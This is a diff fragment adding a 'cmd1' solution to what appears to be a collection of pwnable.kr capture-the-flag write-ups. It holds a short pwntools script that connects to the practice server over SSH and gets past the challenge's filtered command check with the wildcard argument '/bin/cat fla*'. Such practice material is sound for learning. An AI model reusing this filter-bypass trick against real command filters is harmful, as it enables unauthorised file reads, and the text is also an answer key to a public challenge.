@@ -260,3 +260,13 @@ while True:
         print(result, end='')
         break
 ```
+
+## cmd1
+
+#### Solution
+```python
+from pwn import *
+
+vm = ssh("cmd1", "pwnable.kr", 2222, "guest")
+print(vm.run_to_end("./cmd1 '/bin/cat fla*'"))
+```
